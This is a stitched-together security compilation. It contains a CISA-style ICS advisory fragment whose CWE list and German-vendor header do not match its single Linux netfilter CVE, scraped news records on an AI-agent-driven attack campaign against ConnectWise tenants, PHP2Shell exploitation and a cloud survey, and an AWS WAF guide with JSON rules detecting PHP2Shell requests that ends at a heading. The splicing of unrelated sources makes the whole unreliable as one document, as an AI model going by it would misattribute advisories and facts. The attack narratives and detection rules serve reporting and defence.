Access of Uninitialized Pointer, Buffer Copy without Checking Size of Input ('Classic Buffer Overflow'), Deadlock, Detection of Error Condition Without Action, Double Free, Expired Pointer Dereference, Heap-based Buffer Overflow, Improper Control of Resource Identifiers ('Resource Injection'), Improper Control of a Resource Through its Lifetime, Improper Handling of Length Parameter Inconsistency, Improper Handling of Missing Special Element, Improper Handling of Structural Elements, Improper Input Validation, Improper Locking, Improper Resource Locking, Improper Restriction of Operations within the Bounds of a Memory Buffer, Improper Update of Reference Count, Improper Validation of Array Index, Improper Validation of Consistency within Input, Improper Validation of Specified Index, Position, or Offset in Input, Improper Validation of Specified Quantity in Input, Improper Validation of Specified Type of Input, Incorrect Synchronization, Integer Overflow or Wraparound, Integer Underflow (Wrap or Wraparound), Loop with Unreachable Exit Condition ('Infinite Loop'), Missing Default Case in Multiple Condition Expression, Missing Initialization of Resource, Missing Lock Check, Missing Release of Memory after Effective Lifetime, Missing Release of Resource after Effective Lifetime, Multiple Locks of a Critical Resource, NULL Pointer Dereference, Operation on a Resource after Expiration or Release, Out-of-bounds Read, Out-of-bounds Write, Plaintext Storage of a Password, Release of Invalid Pointer or Reference, Return of Wrong Status Code, Signal Handler Race Condition, Time-of-check Time-of-use (TOCTOU) Race Condition, Unchecked Return Value, Use After Free, Use of Incorrect Operator, Use of Uninitialized Resource, Write-what-where Condition

Background

Critical Infrastructure Sectors: Critical Manufacturing, Transportation Systems, Energy, Healthcare and Public Health, Financial Services, Government Services and Facilities

Countries/Areas Deployed: Worldwide

Company Headquarters Location: Germany

Vulnerabilities

Expand All +

CVE-2023-52927

In the Linux kernel, the following vulnerability has been resolved: netfilter: allow exp not to be removed in nf_ct_find_expectation Currently nf_conntrack_in() calling nf_ct_find_expectation() will remove the exp from the hash table. However, in some scenario, we expect the exp not to be removed when the created ct will not be confirmed, like in OVS and TC conntrack in the following patches. This patch allows exp not to be removed by setting IPS_CONFIRMED in the status of the tmpl.

CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.

CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.

CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets.

Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies.

Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.

articles.title: Microsoft: Chinese State Actor Used AI to Compromise ConnectWise Tenants
articles.context: Microsoft assessed that a threat actor, tracked as Storm-0940, utilized agentic AI penetration testing framework ARTEX to target hundreds of organizations globally across a...
articles.full_text:
A Chinese nation-state actor was responsible for the compromise of Microsoft365 tenants used by ConnectWise, which led to IT management software provider taking a number of its cloud services offline.

Microsoft assessed that a threat actor, tracked as Storm-0940, utilized agentic AI penetration testing framework ARTEX to target hundreds of organizations globally across a broad range of industries, beginning in September 2026.

The China-aligned group was able to obtain privileged access to a number of organizations’ cloud infrastructure, including ConnectWise, often in less than three hours from initial targeting.

The campaign targeted industries such as aerospace and defense, automotive, chemicals, energy, financial services, government, legal, manufacturing, media, military, semiconductor, software, technology, and think tanks and non-profits.

Storm-0940 has been active since 2021 and its primary objective is data theft. It uses password spraying and exploitation of internet-facing applications for initial access, and establishes persistence in cloud environments by adding credentials to existing OAuth applications.

Attackers Target ConnectWise Customers

After gaining unauthorized access to the ConnectWise multi-tenant application, the China-aligned actor targeted the IT services firm’s downstream customers using the ARTEX platform to accelerate scanning and reconnaissance, password spraying and OAuth application abuse.

The group attempted to sign-in to more than 2250 tenants at 2900 sign-in attempts per minute. Microsoft said the pace of this supply chain attack gives defenders little time to detect and respond.

Microsoft revealed that it had identified multiple customer environments with evidence of follow-on activity, including reconnaissance, application credential modifications to establish persistence, and changes involving identities, groups and privileged roles.

“After acquiring control of the identities of multiple ConnectWise cloud applications, the AI agents operating on behalf of the threat actor continued to use the same IP range to authenticate to customer environments using the illicit access acquired through these stolen app credentials, effectively taking advantage of the already established trust by these apps within a tenant,” the tech giant explained in a blog dated October 21.

In an update published on October 21, ConnectWise acknowledged Microsoft’s findings and the extensive use of AI to compromise its Microsoft365 tenants.

“Nation-state actors are increasingly targeting the software supply chain, because one trusted connection can open the door to many organizations. AI now lets them test those connections at what Microsoft calls 'machine speed'. MSPs are in the middle of that chain. They are targets in their own right, and they are also a path into every client they serve,” the company wrote.

ConnectWise Cloud Services Remains Offline

ConnectWise first identified suspicious activity in its network on October 15, before discovering unauthorized access to application identities within its Cloud Backup environment on October 17.

The discovery resulted in several ConnectWise cloud services including Cloud Backup (previously known as SkyKick), SaaS Security and Cloud Management being taken offline while the company investigates the incident.

These services remain offline, according to the company’s status page.

However, ConnectWise said in an advisory on October 22 that it had started a phased restoration of its Cloud Backup service.

“We expect restoration to take several days and will share service-specific availability and reconnection instructions as confirmed. Keep affected connections disabled until formal instructions apply to your service,” it told customers.

The firm added that existing backup archives remain encrypted, isolated, and preserved, with no indication of compromise, while there is no evidence that other ConnectWise products and services are impacted by the incident.

Customers have also been advised to review individual Microsoft 365 tenants for unauthorized changes or persistent access.

The ARTEX Agentic AI Platform Threat

ARTEX is a multi-agent large-language model (LLM) that can use any AI model to automate a variety of offensive security workflows, including penetration test from reconnaissance through data exfiltration.

The agents then accumulate the discovered assets and vulnerabilities into a graph during the penetration test, Microsoft explained.

While the platform’s user interface and generated output default to English, the framework can be switched to Korean, Mandarin, Spanish, or Japanese.

In October 2026, CrowdStrike reported that a China-based threat actor used ARTEX to discover vulnerabilities and compromise specific services in South Korean financial organizations, a campaign that resulted in the exfiltration of data.

articles.title: PHP2Shell Exploitation Attempt Detected by Amazon Four Days Before Vulnerability Disclosure
articles.context: Now the patches have been released, the Amazon Threat Intelligence team has publically confirmed they observed a PHP2Shell exploitation attempt dating October 17
articles.full_text:
Someone tried to exploit two critical vulnerabilities in the PHP programming language four days before the vulnerabilities were published and the flaws are now being exploited in the wild at scale, according to Amazon.

The flaws, tracked as CVE-2026-109618 and CVE-2026-109619 and collectively known as ‘PHP2Shell,’ could allow unauthenticated remote code execution (RCE) and server takeover on any websites relying on any PHP version released in the last decade – going back to version 5.4.

PHP is used by approximately 69.7% of websites whose server-side programming language is known, according to recent W3Techs data. These include many content management systems (CMS) like WordPress, Drupal, Joomla and Magento as well as e-commerce and web services platforms.

The bugs were discovered by security researchers at California-based security firm Calif and Google Cloud’s Wiz, with collaboration from OpenAI’s Patch the Planet project, in August. Public disclosure was scheduled for October 21, when the PHP Foundation planned to release the security patches.

However, on October 20, a pseudonymous user of the Hacker News forum leaked some information about the flaws before the patches were ready.

This led to many organizations across the world, including French public administrations, the Dutch National Cyber Security Centre and the University of Vienna taking their websites offline to prepare for and then apply the patches.

Now the patches have been released, the Amazon Threat Intelligence team has publically confirmed they observed a PHP2Shell exploitation attempt dating October 17. The attempt occurred in MadPot, an internal honeypot system created by Amazon Web Services (AWS) to monitor, study and disrupt global cybercrime.

Early Exploitation Attempt Likely From A “Threat Actor”

The exploit attempt originated from an IP address associated with a commercial anonymization network. According to the Amazon researchers, this suggests the activity was conducted by a threat actor, though it remains unclear how the actor acquired exploit information prior to disclosure.

In addition, they said they identified multiple proof-of-concept (PoC) exploits for PHP2Shell on October 21, around 12 hours before the vulnerability’s scheduled disclosure at 2pm GMT.

The earliest exploit was detected at approximately 2am GMT, with further attempts targeting the company’s MadPot sensors between 2am and 8am GMT from additional infrastructure.

According to the researchers, variations in the payloads and anonymization infrastructure suggested that multiple threat actors were involved. However, it was unclear whether the attempts would have succeeded against real-world systems.

Further PoC exploits emerged within hours of the release of the PHP2Shell patches, which were used against Amazon’s sensors almost immediately.

The researchers warned that PHP2Shell is now being broadly exploited in the wild.

Emerging Evidence of PHP2Shell Exploitation Attempts

Other security and threat intelligence teams have started to report active exploitation attempts of CVE-2026-109618 and CVE-2026-109619 in the wild.

Matthew Prince, co-founder and CEO of Cloudflare, said on X his company saw “thousands of attempts to exploit” the vulnerabilities within the 10 hours that preceded the disclosure.

“That jumped to tens of thousands in the 45 minutes post announcement, hundreds of thousands within two hours, and millions now,” he added.

Other security firms, including Beelzebub, Ellio, Recorded Future, VulnCheck, WatchTowr and Wiz have also observed evidence of exploitation attempts in the wild for both vulnerabilities.

articles.title: Cloud Security Maturity Lags Despite Widespread Adoption, SANS Warns
articles.context: Attackers Hide Malware Behind Signed ChatGPT and Claude Binaries Attackers Exploit Teams External Chat to Breach Organizations in Under 15 Minutes Online Scam Volumes Double to...
articles.full_text:
Nearly all organizations now run production workloads in the cloud, yet only 40% consider their cloud security strategy advanced or optimized, highlighting a significant maturity gap, according to SANS.

This is according to the 2026 SANS Cloud Security Survey Insights report which surveyed 400 IT and security professionals.

SANS found that 51% of respondents were running enterprise-scale (2501 to 10,000 workloads, containers, or instances) or hyperscale (more than 10,000) environments and 73% already having a dedicated cloud security team or role.

The report also noted that 93% of organizations already run production workloads in the cloud and 65% run more than one provider.

SANS noted that because so many respondents have a dedicated team for cloud security, it indicates that a maturity gap persists despite organizations being well-resourced.

Overall, 45% of respondents described their cloud security strategy as “intermediated” with partial implementation of a defined strategy.

This partial implementation is an issue, according to the report, and leads to security incidents.

Misconfiguration Make Up Nearly Half of Critical Cloud Incidents

The report found that misconfiguration is the leading cause of critical cloud incidents (45%), close to double that of the next highest factor, credential theft, which made up 22% of incidents.

What’s more, misconfigurations often remain in place for significant periods, with around half of organizations (49%) found to need more than 24 hours to close a known critical gap.

"Misconfiguration is not an exotic attack class. It is a known gap sitting in an account somebody already owns," said Serge Borso, SANS Principal Instructor. "What makes it persist is not the attacker. It is the distance between finding the gap and fixing it, across too many consoles with nobody clearly owning the result. That is why consolidation and enforcement matter more right now than implementing yet another detection tool. The industry has finished deciding to move to the cloud and is now paying for how fast it did.”

Despite the security maturity gap, cloud security budgets were found to be increasing for most, with 28% of respondents reporting significant investment to modernize or adopt new technology such as AI or Cloud-Native Application Protection Platform (CNAPP), and another 42% reporting incremental growth.

Overall, 70% of organizations are spending more on cloud security than a year ago. Only 7% reported budget cuts.

Just 21% of respondents said their organization runs a single consolidated CNAPP platform. Meanwhile, 31% still maintain separate point solutions across Cloud Security Posture Management (CSPM), Cloud Workload Protection Platform (CWPP), and Cloud Infrastructure Entitlement Management (CIEM). Of those surveyed, 23% are actively evaluating a move to consolidate.

The SANS data points towards three priorities for security teams in the year ahead:

Strengthen cloud security by enforcing automated policy checks in infrastructure-as-code pipelines, preventing misconfigurations before deployment

Reduce security tool sprawl by consolidating posture management, workload protection and identity security tools into unified platforms

Extend zero trust beyond authentication by adopting continuous, context-based controls that limit what users and workloads can access after login

articles.title: Using AWS WAF to apply mitigations for PHP2Shell RCE vulnerabilities (CVE-2026-109618 and CVE-2026-109619)
articles.context: Patching is the only complete fix, and you should upgrade PHP as your first priority
articles.full_text:
October 29, 2026: We added guidance for end-of-life PHP versions (8.1 and earlier), including the source backports that the PHP security team published for PHP 7.4, 8.0, and 8.1.

October 23, 2026 (update 2): The PHP project disclosed CVE-2026-115560, a separate remote code execution issue that the October 21 releases don’t fix. It affects only applications with an uncommon configuration that keeps session upload progress enabled. The PHP2Shell_BODY rule in the PHP application managed rule group, version 2.4 and later, already blocks POST requests that carry a PHP session ID and the session upload progress field (PHP_SESSION_UPLOAD_PROGRESS). This helps mitigate CVE-2026-115560 until PHP releases a fix, and no rule group update is needed. PHP recommends setting session.upload_progress.enabled=0 until its next regular bugfix release. If you applied this setting for CVE-2026-109619, keep it in place.

October 23, 2026: We updated this post for version 2.4 of the AWS WAF PHP application managed rule group, which adds the PHP2Shell_BODY_Extended rule for CVE-2026-109618, and AWS made it the default version. AWS is continuously updating the AWS WAF PHP managed rule group to add protection for both CVE-2026-109618 and CVE-2026-109619. If you use the default version, you will be automatically protected without any action on your part. If you have pinned a specific version, update to the latest version to receive this protection. For the latest version and details on the rules added, see the AWS Managed Rules changelog and subscribe to the AWS Managed Rules SNS topic (both linked below). Patching is the only complete fix, and you should upgrade PHP as your first priority.

October 22, 2026: We updated this post to add the AWS WAF PHP application managed rule group. Version 2.3 of the rule group adds the PHP2Shell_BODY rule for CVE-2026-109619.

On October 21, 2026, the PHP project released emergency fixes for two critical remote code execution (RCE) vulnerabilities in the PHP core runtime, tracked as CVE-2026-109618 and CVE-2026-109619 and collectively named PHP2Shell. Both are rated 9.2 (Critical) under CVSS v4.0, and both allow an unauthenticated attacker to run code on a vulnerable server. The fixed releases are PHP 8.5.12, 8.4.27, 8.3.36, and 8.2.35. If you run PHP 8.1 or earlier, the PHP project won’t release a new version for your branch, but backported fixes are available for some versions. See Fix end-of-life PHP versions later in this post.

Patching is the only complete fix, and you should upgrade PHP as your first priority. But patching a fleet takes time: you need to inventory where PHP runs, schedule maintenance windows and test applications against the new builds. This post shows you how to use AWS Web Application Firewall (AWS WAF) to help reduce your exposure during that window. The AWS WAF PHP application managed rule group includes rules for both vulnerabilities: PHP2Shell_BODY for CVE-2026-109619 and PHP2Shell_BODY_Extended for CVE-2026-109618. AWS continues to release new versions of this rule group as detection improves. Track them in the AWS Managed Rules changelog, or subscribe to the AWS Managed Rules SNS topic to get notified. If your protection pack (web ACL) uses this rule group at the default version, these rules are already active. This post shows you how to confirm that and how to add the rule group if you don’t use it yet. It also covers the custom rules that still add defense in depth. It also explains where AWS WAF protection ends, so you don’t develop a false sense of safety. For how Amazon threat intelligence detected PHP2Shell exploitation before public disclosure, see Amazon Threat Intelligence identifies PHP2Shell exploitation prior to public disclosure in MadPot. For AWS service status and patching guidance, see AWS Security Bulletin 2026-143-AWS.

IMPORTANT: Patching is the only complete fix, and you should upgrade PHP as your first priority.

The vulnerabilities in brief

Both PHP2Shell vulnerabilities are unauthenticated RCE issues rooted in how PHP handles multipart/form-data request processing (the request format browsers use for file uploads) before your application code runs, which is why the AWS WAF rules in this post focus on multipart traffic, request body size, and the session upload progress field. At a high level, CVE-2026-109618 corrupts memory when PHP runs out of memory mid-request, and CVE-2026-109619 lets one request leave behind stale data that a later request on the same worker process reuses. For the root-cause analysis, affected versions, and PHP’s own guidance, see the official PHP advisories and release announcement:

CVE-2026-109618 (out-of-memory corruption) – PHP advisory GHSA-w8hw-w9fx-j79w

CVE-2026-109619 (stale global state) – PHP advisory GHSA-6wmf-4rv5-p3rp

PHP security release announcement, October 21, 2026

Where AWS WAF fits in your response

AWS WAF is a defense-in-depth control in this situation, not a replacement for the PHP upgrade. The PHP advisories are explicit: updating to a patched release is the only complete mitigation. One of the two vulnerabilities is largely outside the reach of any web application firewall, as explained later. Treat the managed rules and the custom rules in this post as mitigating controls that help reduce exposure while you patch, then remove them or keep them as supporting controls after you’ve patched.

AWS WAF inspects HTTP requests at the edge. It doesn’t parse the internal structure of a multipart body, and it has no visibility into PHP worker memory or server-side configuration. The following table maps each attack element to whether AWS WAF can help mitigate it.

Attack element

AWS WAF coverage

Request patterns that match CVE-2026-109618

Yes. The PHP2Shell_BODY_Extended rule in the PHP application managed rule group, version 2.4 or later.

Request patterns that match CVE-2026-109619

Yes. The PHP2Shell_BODY rule in the PHP application managed rule group, version 2.3 or later.

Session upload progress field in a multipart POST (PHP_SESSION_UPLOAD_PROGRESS, the form field that turns on PHP’s upload-tracking feature)

Yes. The PHP2Shell_BODY rule (version 2.4 or later) and the custom rule in this post block POST requests that carry a PHP session ID and that field. This also helps mitigate CVE-2026-115560.

Multipart upload path (multipart/form-data, the request type used for file uploads and the entry point for both vulnerabilities)

Yes, if the application has no legitimate multipart uploads. Block multipart/form-data.

Out-of-memory condition from an oversized body

Partial. PHP2Shell_BODY_Extended inspects the request body up to the body inspection limit. Cap the request body size with the Core rule set SizeRestrictions_BODY rule or a custom rule. Neither catches header amplification (many small part headers that cost far more memory to represent than their size on the wire) that stays under the cap.

Repeated attempts against the same worker (the reused PHP process that handles many requests)

Partial. A rate-based rule reduces the volume an exploit needs, but it doesn’t stop a single successful request.

fatal_error_backtraces producer (a PHP 8.5 setting that stores crash-trace state across a request)

No. This is a server configuration setting (fatal_error_backtraces=0).

Invalid or deprecated INI diagnostics as a consumer (warnings PHP raises when applying bad configuration settings)

No. This path runs server-side, not over client HTTP.

Where an application does not accept multipart uploads, an edge rule that blocks multipart/form-data removes the multipart out-of-memory path that works against any application, plus the session-upload-progress trigger, which is a defense-in-depth control during the patch window.

If your application does use multipart uploads, AWS WAF reduces risk but does not close the vulnerability, because header amplification (a few kilobytes of part headers that expand into far more memory inside PHP) stays within size limits and the firewall cannot parse the headers inside individual body parts. In that case, prioritize the PHP upgrade and apply the server-side mitigations described later.

Start with the AWS WAF PHP application managed rule group

The PHP application managed rule group (AWSManagedRulesPHPRuleSet) contains rules that block request patterns associated with the exploitation of vulnerabilities specific to PHP. PHP2Shell_BODY inspects the request body for requests that match CVE-2026-109619 and is in version 2.3 and later. PHP2Shell_BODY_Extended inspects the request body for requests that match CVE-2026-109618 and is in version 2.4 and later. The default action of both rules is Block. The AWS WAF documentation notes that this rule group contains a virtual patch for CVE-2026-109618 and CVE-2026-109619, and that you can add it to your protection pack (web ACL) to help protect your application against exploitation attempts until your application is patched. The rule group uses 100 web ACL capacity units (WCUs). Like the other AWS managed baseline and use-case rule groups, it has no charge beyond standard AWS WAF pricing. For the latest version and details on the rules added, see the AWS Managed Rules changelog and subscribe to the AWS Managed Rules SNS topic.

What you need to do depends on how your web ACL uses the rule group:

You use the default version. Both PHP2Shell_BODY and PHP2Shell_BODY_Extended are already active. Confirm that you haven’t overridden the whole rule group to Count, and review your AWS WAF logs for matches.

You pin a static version. Version_2.3 has PHP2Shell_BODY but not PHP2Shell_BODY_Extended, and Version_2.2 and earlier have neither. Change the version to Version_2.4 or later. We recommend that you use the default version.

You don’t use the rule group yet. Add it to the web ACL in front of each PHP workload, as shown in the following example.

To add the rule group in the AWS WAF console, open your protection pack (web ACL), choose Manage rules, and then do the following, as shown in Figure 1:

Choose Add rule.

Select AWS-managed rule group.

Choose Next.

Under Free, choose PHP application.

For Version, keep Default (recommended). If you need to pin a version, choose Version_2.4 or later.

Under Rule overrides, confirm that PHP2Shell_BODY and PHP2Shell_BODY_Extended are listed. To review matches before they block, set both to Count.

Choose Add rule.

Figure 1: Adding the PHP application managed rule group in the AWS WAF console.

If you prefer to work programmatically, run the following commands to see the current default version and the version that a web ACL uses. Both commands are read-only.

aws wafv2 list-available-managed-rule-group-versions \ --vendor-name AWS --name AWSManagedRulesPHPRuleSet --scope REGIONAL aws wafv2 get-web-acl --name <web-acl-name> --id <web-acl-id> --scope REGIONAL \ --query "WebACL.Rules[?Statement.ManagedRuleGroupStatement.Name=='AWSManagedRulesPHPRuleSet']"

For web ACLs associated with Amazon CloudFront, use --scope CLOUDFRONT and the US East (N. Virginia) Region. A rule without a Version field uses the default version.

The following rule adds the rule group at the default version. The RuleActionOverrides entry sets PHP2Shell_BODY and PHP2Shell_BODY_Extended to Count so you can review their matches before they block. Remove the override when you’re satisfied. Given how quickly exploitation followed disclosure, measure that review period in hours, not days. If you need to pin the rule group, add a Version field set to Version_2.4 or later to the ManagedRuleGroupStatement. We recommend the default version.

{ "Name": "AWS-AWSManagedRulesPHPRuleSet", "Priority": 0, "Statement": { "ManagedRuleGroupStatement": { "VendorName": "AWS", "Name": "AWSManagedRulesPHPRuleSet", "RuleActionOverrides": [ { "Name": "PHP2Shell_BODY", "ActionToUse": { "Count": {} } }, { "Name": "PHP2Shell_BODY_Extended", "ActionToUse": { "Count": {} } } ] } }, "OverrideAction": { "None": {} }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "AWS-AWSManagedRulesPHPRuleSet" } }

If PHP2Shell_BODY or PHP2Shell_BODY_Extended matches legitimate requests, keep the rule in Count and add a label-based exception after the rule group. The rule group adds the labels awswaf:managed:aws:php-app:PHP2Shell_Body and awswaf:managed:aws:php-app:PHP2Shell_Body_Extended to requests that match either rule, and the following rule blocks those requests everywhere except one path. Requests to the excluded path aren’t protected by this rule, so keep the exception as narrow as you can and patch that application first. Labels are case sensitive: confirm the label name in the rule group’s available labels (the DescribeManagedRuleGroup API) before you deploy. For the full pattern, see Creating exceptions in the AWS WAF best practices guide.

{ "Name": "PHP2Shell-Body-Exception", "Priority": 1, "Action": { "Block": {} }, "Statement": { "AndStatement": { "Statements": [ { "OrStatement": { "Statements": [ { "LabelMatchStatement": { "Scope": "LABEL", "Key": "awswaf:managed:aws:php-app:PHP2Shell_Body" } }, { "LabelMatchStatement": { "Scope": "LABEL", "Key": "awswaf:managed:aws:php-app:PHP2Shell_Body_Extended" } } ] } }, { "NotStatement": { "Statement": { "ByteMatchStatement": { "FieldToMatch": { "UriPath": {} }, "PositionalConstraint": "STARTS_WITH", "SearchString": "/path/to/legitimate-upload", "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ] } } } } ] } }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "PHP2ShellBodyException" } }

You can also return a web ACL to Version_2.2 while you tune, but that version includes neither PHP2Shell_BODY nor PHP2Shell_BODY_Extended. Treat a rollback as removing the CVE-2026-109619 and CVE-2026-109618 protection, and prefer the Count override and exception.

PHP2Shell_BODY and PHP2Shell_BODY_Extended inspect the request body only up to the web ACL body inspection limit. Both use the Continue oversize option, so they don’t inspect content beyond that limit. Pair them with a body size rule such as SizeRestrictions_BODY in the Core rule set (AWSManagedRulesCommonRuleSet), which blocks request bodies over 8 KB. If you set that rule to Count because of upload paths, use a label-based exception scoped to those paths instead. That keeps the rule in Block everywhere else. For the limit on each resource type, see Request body inspection limits later in this post.

Additional WAF Rules to consider

The managed rule groups cover two of the rules in this section. PHP2Shell_BODY in the PHP application rule group covers CVE-2026-109619, the same CVE as the custom rule later in this post. SizeRestrictions_BODY in the Core rule set caps request bodies at 8 KB, which covers body content beyond the inspection limit. For CVE-2026-109618 itself, the PHP application rule group includes PHP2Shell_BODY_Extended (version 2.4 or later). No AWS managed rule group blocks all multipart requests or rate-limits POST requests, so those two rules remain custom. Use them where they fit your application.

The following rules are in AWS WAF JSON format. Add each one to the protection pack (web ACL) associated with the CloudFront distribution, Application Load Balancer, or API Gateway stage in front of your PHP workloads. Adjust the priorities to fit your web ACL. The AWS WAF best practices guide describes a recommended rule order, with managed rule groups before the label-based exceptions that depend on them.

IMPORTANT: Before you change anything, turn on AWS WAF logging so you can see what each rule matches. Start every rule in Count mode, confirm it doesn’t match legitimate traffic, then switch to Block.

Request body inspection limits The body inspection limit depends on the resource that the web ACL protects. On Application Load Balancer and AWS AppSync, the limit is a fixed 8 KB. On CloudFront, API Gateway, Amazon Cognito, App Runner, Verified Access, and Amazon Bedrock AgentCore Gateway, the default is 16 KB, and you can raise it up to 64 KB through the web ACL AssociationConfig, as shown in the following example. AWS WAF treats any part of the body beyond the limit as oversize. Choose a limit that fits the rules you deploy, because a body size rule can only enforce a cap up to the inspected size.

aws wafv2 update-web-acl ... --association-config \ 'RequestBody={CLOUDFRONT={DefaultSizeInspectionLimit=KB_64}}'

Custom rule for CVE-2026-109619 (if you can’t use the managed rule group) Use this custom rule if you would prefer to use a custom rule instead of a managed rule group. It targets CVE-2026-109619 and blocks a request only when all three conditions in its AndStatement are true at once:

The method is exactly POST, matched on the HTTP method with no transformation.

A PHP session identifier is present (the nested OrStatement, so either sub-condition satisfies this leg):

PHPSESSID appears as a cookie key (exact match on the key, scanning all cookies), or

PHPSESSID appears anywhere in the request body (contains match).

The body contains PHP_SESSION_UPLOAD_PROGRESS, the form field that activates PHP’s session upload progress feature.

Pair the rule with session.upload_progress.enabled=0 on the server, which turns the feature off. The following rule has its action set to Count. Change it to Block after you confirm it doesn’t match legitimate traffic.

{ "Name": "PHP2Shell", "Priority": 0, "Statement": { "AndStatement": { "Statements": [ { "ByteMatchStatement": { "SearchString": "POST", "FieldToMatch": { "Method": {} }, "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ], "PositionalConstraint": "EXACTLY" } }, { "OrStatement": { "Statements": [ { "ByteMatchStatement": { "SearchString": "PHPSESSID", "FieldToMatch": { "Cookies": { "MatchPattern": { "All": {} }, "MatchScope": "KEY", "OversizeHandling": "CONTINUE" } }, "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ], "PositionalConstraint": "EXACTLY" } }, { "ByteMatchStatement": { "SearchString": "PHPSESSID", "FieldToMatch": { "Body": { "OversizeHandling": "CONTINUE" } }, "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ], "PositionalConstraint": "CONTAINS" } } ] } }, { "ByteMatchStatement": { "SearchString": "PHP_SESSION_UPLOAD_PROGRESS", "FieldToMatch": { "Body": { "OversizeHandling": "CONTINUE" } }, "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ], "PositionalConstraint": "CONTAINS" } } ] } }, "Action": { "Count": {} }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "PHP2Shell" } }

Block multipart requests when the application has no uploads

NOTE: This rule, in Block mode, breaks applications that require file uploads. If your application doesn’t require file uploads, blocking removes the multipart out-of-memory path that works against any application for both CVEs at the edge.

AWS WAF inspects a single named header in full, with no 8 KB header limit, so matching the Content-Type header is reliable.

{ "Name": "Block-Multipart-FormData", "Priority": 1, "Action": { "Count": {} }, "Statement": { "ByteMatchStatement": { "FieldToMatch": { "SingleHeader": { "Name": "content-type" } }, "PositionalConstraint": "CONTAINS", "SearchString": "multipart/form-data", "TextTransformations": [ { "Priority": 0, "Type": "LOWERCASE" } ] } }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "PHP2ShellBlockMultipart" } }

Cap the request body size Capping body size reduces the out-of-memory condition behind CVE-2026-109618 and the stale state it can leave behind. It also covers request bodies larger than the inspection limit, which body-inspecting rules such as PHP2Shell_BODY and PHP2Shell_BODY_Extended evaluate only in part. If you use the Core rule set, its SizeRestrictions_BODY rule blocks bodies over 8 KB by default. Use the following custom rule when you need a different threshold or don’t use the Core rule set. It uses OversizeHandling: MATCH with a size constraint so that any body larger than the threshold is blocked, including bodies that exceed the inspection limit. To enforce a cap of N bytes, the web ACL body inspection limit must be at least N.

Note that you can’t cap the numeric Content-Length with a size constraint, because the constraint measures the length of the header value string, not the number it contains. If your application has legitimate large uploads, scope this rule to non-upload paths with an AndStatement on the URI path, or it will break those uploads.

{ "Name": "Block-Oversize-Body", "Priority": 2, "Action": { "Count": {} }, "Statement": { "SizeConstraintStatement": { "FieldToMatch": { "Body": { "OversizeHandling": "MATCH" } }, "ComparisonOperator": "GT", "Size": 8192, "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ] } }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "PHP2ShellBlockOversizeBody" } }

NOTE: If a specific managed rule breaks legitimate traffic, override that rule to Count rather than disabling the whole group.

Rate-limit repeated attempts A rate-based rule on POST requests limits how many requests one IP address can send. That lowers the chance of triggering either vulnerability through volume. It also makes the stale-state path harder, because that path needs a producer request and a consumer request to land on the same worker. Set the limit from your normal per-IP POST rate; 100 requests per 60 seconds is a starting point. This rule complements a server setting of pm.max_requests=1, which recycles the worker on each request.

{ "Name": "RateLimit-Posts", "Priority": 3, "Action": { "Count": {} }, "Statement": { "RateBasedStatement": { "Limit": 100, "EvaluationWindowSec": 60, "AggregateKeyType": "IP", "ScopeDownStatement": { "ByteMatchStatement": { "FieldToMatch": { "Method": {} }, "PositionalConstraint": "EXACTLY", "SearchString": "POST", "TextTransformations": [ { "Priority": 0, "Type": "NONE" } ] } } } }, "VisibilityConfig": { "SampledRequestsEnabled": true, "CloudWatchMetricsEnabled": true, "MetricName": "PHP2ShellRateLimitPosts" } }

Server-side mitigations that complement AWS WAF

These host and runtime changes address the parts of CVE-2026-109619 that sit below the HTTP layer a WAF inspects, so they fall outside its scope by design. Apply them alongside the AWS WAF rules as the host and runtime layer of your defense.

Upgrade PHP to 8.5.12, 8.4.27, 8.3.36, or 8.2.35, and restart every PHP worker so the new runtime is in use. This is the only complete fix for CVE-2026-109618 and CVE-2026-109619. These releases don’t fix CVE-2026-115560; see the session.upload_progress.enabled bullet. For PHP 8.1 and earlier, see Fix end-of-life PHP versions.

Address CVE-2026-109618 at the PHP level. Set memory_limit=-1 in a way applications can’t override, such as php_admin_value in the FPM pool or Apache configuration, and check that no pool, directory, or application setting puts a finite limit back. Keep post_max_size low (8M where the application accepts no uploads, 32M where it does), and keep upload_max_filesize below post_max_size. Use a container or cgroup limit as an availability boundary, not RLIMIT_AS or RLIMIT_DATA, which can cause the vulnerable allocation failure.

Set fatal_error_backtraces=0 on PHP 8.5 and restart every worker. This disables the setting that stores crash-trace state across a request, one of the confirmed ways the vulnerability is triggered.

Set session.upload_progress.enabled=0 and restart every worker. This turns off the upload-tracking feature that’s the other confirmed trigger. Keep it off after you patch: it is also PHP’s mitigation for CVE-2026-115560, which the October 21 releases don’t fix.

Prefer php.ini, FPM pool, or server startup configuration over per-request INI overrides (settings applied per request through .htaccess, php_value, or FastCGI PHP_VALUE). Remove obsolete directives so they don’t raise diagnostic warnings.

Eliminate fatal errors and execution timeouts on attacker-reachable routes, including upload, import, error-page, shutdown, serialization, and extension paths.

Set pm.max_requests=1 if performance allows, so each worker process is recycled after one request, which breaks the link between the request that plants stale data and a later request that would reuse it.

Turn on error logging (log_errors=On, a working error_log, error_reporting=E_ALL) and review your Apache, FPM, or proxy logs for repeated warnings, deprecations, fatal errors, and timeouts on attacker-controlled routes. The absence of errors is not proof of safety.

Fix end-of-life PHP versions

